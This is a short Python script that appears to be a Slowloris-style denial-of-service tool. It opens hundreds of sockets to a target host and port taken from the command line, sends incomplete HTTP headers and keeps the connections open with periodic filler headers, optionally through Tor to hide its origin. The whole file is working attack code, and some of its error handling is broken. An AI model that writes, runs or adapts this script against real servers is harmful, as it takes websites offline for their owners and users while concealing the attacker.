#author - Dund33
#This script is just quick and dirty version. It will be improved over time...
#trust me...
#credits for Dan Haim(negativeiq@users.sourceforge.net) for SocksiPy and Anorov for PySocks
#http://sourceforge.net/projects/socksipy
import socks
import socket
import time
import sys



def make_array(n_nodes, proxy_host, proxy_port):
 sockets = []
 for i in range(0,n_nodes):
  s=socks.socksocket()
  s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
  sockets.append(s)
 return sockets

def make_array_no_proxy(n_nodes):
  sockets = []
  for i in range(0,n_nodes):
    s=socket.socket()
    sockets.append(s)
  return sockets



def connect_da_sockets(sockets, server, port):
  for s in sockets:
   s.connect((server,port))


def send_headers(sockets,target_ip):
  for s in sockets:
    s.sendall("GET / HTTP/1.1\r\n")
    s.sendall("Host:"+target_ip+"\r\n")
    s.sendall("Accept: */*\r\n")
    s.sendall("Accept-Language: en-us\r\n")
    s.sendall("Connection: keep-alive\r\n")

def end(sockets):
   for s in sockets:
     s.send("\r\n")

def keep_up(sockets, server, port):
  for s in sockets:
   try:
     s.send("X-a: b\r\n")
   except s.timeout:
     print("node dead adding new one")
     s.remove(s)
     newsock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     newsock.connect((server,port))
  

n_of_nodes=500
keep_up_time=50
n_of_repeats=5
tor_port=9050
use_tor=False
target_ip='0.0.0.0'
target_port=80

  
for i in range(0,len(sys.argv)):
  if(sys.argv[i]=='--nodes'):  #getting args from command line
     n_of_nodes=int(sys.argv[i+1])
  if(sys.argv[i]=='--url'):
     target_ip=socket.gethostbyname(sys.argv[i+1])
  if(sys.argv[i]=='--ip'):
     target_ip=sys.argv[i+1]
  if(sys.argv[i]=='--port'):
     target_port=int(sys.argv[i+1])
  if(sys.argv[i]=='--keep-up'):
     keep_up_time=int(sys.argv[i+1])
  if(sys.argv[i]=='--tries'):
     n_of_repeats=int(sys.argv[i+1])
  if(sys.argv[i]=='--use-tor'):
     use_tor=True
     tor_port=int(sys.argv[i+1])


if(use_tor==True):
  socket_array = make_array(n_of_nodes,'127.0.0.1',tor_port)
else:
  print('!!!NOT USING TOR!!!')
  socket_array = make_array_no_proxy(n_of_nodes) 

try:
  connect_da_sockets(socket_array,target_ip,target_port)
except socket.error:
  print('couldnt connect...')
  time.sleep(0.5)
  print('sorry...')
  time.sleep(1)
  exit()

print('Beginning test\r\n')
print('Sending headers\r\n')
send_headers(socket_array,target_ip)
print('Headers sent\r\n')

for i in range(0,n_of_repeats):
  keep_up(socket_array,target_ip,target_port)
  time.sleep(keep_up_time)

end(socket_array)




